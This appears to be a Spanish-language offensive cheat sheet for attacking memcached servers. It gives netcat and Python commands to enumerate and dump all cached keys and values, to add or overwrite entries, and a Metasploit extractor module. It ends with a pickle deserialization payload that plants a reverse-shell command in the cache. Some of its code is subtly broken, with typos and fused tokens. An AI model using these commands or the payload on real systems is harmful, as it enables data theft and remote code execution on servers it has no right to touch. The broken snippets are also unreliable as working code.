## Info
### Nmap
```bash
nmap -p port --script memcached-info IP
```
### Netcat/Telnet
#### Conexion
```bash
nc IP PORT
```
#### Version 
```bash
echo -e 'version1\r\nquit\r\n' | nc IP PORT
```
#### Obtener la lista de keys 
```python
from pymemcache.client.base import Client
import pprint
client = Client(('IP', PORT))
pp = pprint.PrettyPrinter(indent=4)
for i in range(0 , 7):
  pp.pprint(client.stats("cachedump",str(i),"0"))
```
#### Obtener el valor de una key
```bash
echo -e 'get KEYNAME1\r\nquit\r\n' | nc IP PORT
```
##### JSONIFY Data usando pickle
```bash
echo -e "get data\r\nquit\r\n" | nc IP PORT > data
python -c 'import pickle;print pickle.load(open("data"));'
```
#### Obtener el numero total de parejas key value en el servidor
```bash
echo -e 'stats items1\r\nquit\r\n' | nc IP PORT | grep 'number '
```
Y sumamos los numeros de cada item 

##### Python Implementation

```python
python -c 'from pymemcache.client.base import Client; client = Client(("IP", PORT)); printclient.stats()["curr_items"]'
```
#### Añadir una clave-valor nueva
```bash
nc IP PORT
> add CLAVE 0 0 LENGHT
> VALUE 
```
#### Actualizar el valor de una clave
```bash
nc IP PORT
> replace CLAVE 0 0 LENGHT
> VALUE 
```
#### Dump

##### Bash
```bash
xargs -L1 -I% sh -c 'echo "get KEYNAME" | nc IP PORT'
for key in $(memcdump --server=IP); do echo ------ $key ------; memccat --server=IP $key; done
for key in $(memcdump --server=target-1); do echo ------ $key ------; memccat --server=target-1 $key; done
```
##### Metasploit module
```msf
auxiliary/gather/memcached_extractor
```
### Injections 
#### Libro de referencia 
```
https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf
```
#### Python Pickle Serlization Attack

Ante un mensaje de error de pickle 
```python
import pickle
import subprocess
import os
from pymemcache.client.base import Client

class Shell(object):
    def __reduce__(self):
        return (os.system,("python -c 'importsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'&",))
        
client = Client(('IP', PORT))
client.set("pickled",pickle.dumps(Shell()))
```
